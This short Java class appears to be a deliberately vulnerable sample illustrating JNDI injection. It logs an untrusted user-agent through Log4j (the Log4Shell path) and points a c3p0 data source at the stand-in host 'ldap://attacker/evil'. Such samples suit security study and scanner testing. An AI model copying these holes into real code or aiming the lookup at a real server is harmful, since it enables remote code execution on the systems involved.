```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import com.mchange.v2.c3p0.ComboPooledDataSource;

public class Svc {
    private static final Logger log = LogManager.getLogger(Svc.class);
    public void handle(String ua) {
        log.info("request from {}", ua);              // tainted -> JndiLookup
        ComboPooledDataSource ds = new ComboPooledDataSource();
        ds.setJndiName("ldap://attacker/evil");        // c3p0 JNDI pivot
    }
}
